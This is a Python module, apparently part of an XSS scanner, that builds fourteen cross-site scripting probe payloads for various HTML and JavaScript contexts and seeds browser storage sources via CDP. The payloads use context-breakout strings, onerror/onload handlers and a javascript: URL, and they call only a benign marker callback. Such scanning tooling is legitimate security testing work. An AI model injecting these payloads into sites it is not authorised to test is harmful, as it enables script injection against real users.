"""Named callback-only probes and input-source metadata; no custom script input."""
import json

PROBE_NAMES = ('html', 'attribute', 'unquoted_attribute', 'textarea', 'title', 'comment', 'style',
               'js_single', 'js_double', 'js_template', 'script_close', 'svg', 'url', 'js_expression')
INPUT_SOURCES = {'query': 'urlsearchparams', 'hash': 'location_hash', 'form': 'input_value',
                 'local_storage': 'localstorage', 'session_storage': 'sessionstorage',
                 'window_name': 'window_name', 'post_message': 'postmessage'}
CLIENT_ONLY = {'hash', 'local_storage', 'session_storage', 'window_name', 'post_message'}


def probes(marker):
    callback = 'window.__rmXss(' + json.dumps(marker) + ')'
    html = f"""<img src="/.__recon_xss_missing_{marker}" onerror='{callback}'>"""
    script_html = '<svg data-rm=' + marker + ' onload=window.__rmXss(String.fromCharCode(' + ','.join(str(ord(c)) for c in marker) + '))>'
    return {'html': html, 'attribute': '\'">' + html, 'unquoted_attribute': '>' + html,
            'textarea': '</textarea>' + html, 'title': '</title>' + html,
            'comment': '-->' + html, 'style': '</style>' + html, 'js_single': "';" + callback + '//',
            'js_double': '";' + callback + '//', 'js_template': '${' + callback + '}',
            'script_close': '</script>' + script_html, 'svg': "<svg onload='" + callback + "'>",
            'url': "javascript:window.__rmXss('" + marker + "')", 'js_expression': callback}


def source_script(kind, name, value):
    """Runs before page scripts via CDP, preserving storage/window source semantics."""
    settings = json.dumps({'kind': kind, 'name': name, 'value': value})
    return '''(() => {const s = SETTINGS;
      if (s.kind === 'window_name') window.name = s.value;
      else if (s.kind === 'local_storage') localStorage.setItem(s.name, s.value);
      else if (s.kind === 'session_storage') sessionStorage.setItem(s.name, s.value);
    })()'''.replace('SETTINGS', settings)
